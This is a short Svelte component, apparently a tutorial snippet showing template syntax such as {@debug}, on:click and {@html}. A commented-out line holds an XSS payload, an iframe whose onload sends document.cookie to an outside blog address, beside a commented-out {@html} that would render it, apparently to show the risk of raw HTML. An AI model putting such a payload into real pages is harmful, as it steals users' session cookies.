<script>
	// let h1 = '<h1>Hello SHIN</h1>'
	// let xss = '<iframe onload="document.location=`https://heropy.blog?${document.cookie}`"></iframe>'
	let name = "heropy"
	let index = 0
</script>

{@debug index, name}
<h1 on:click={() => {index += 1}}>Hello {name}!</h1>

<!-- {@html h1}
{@html xss} -->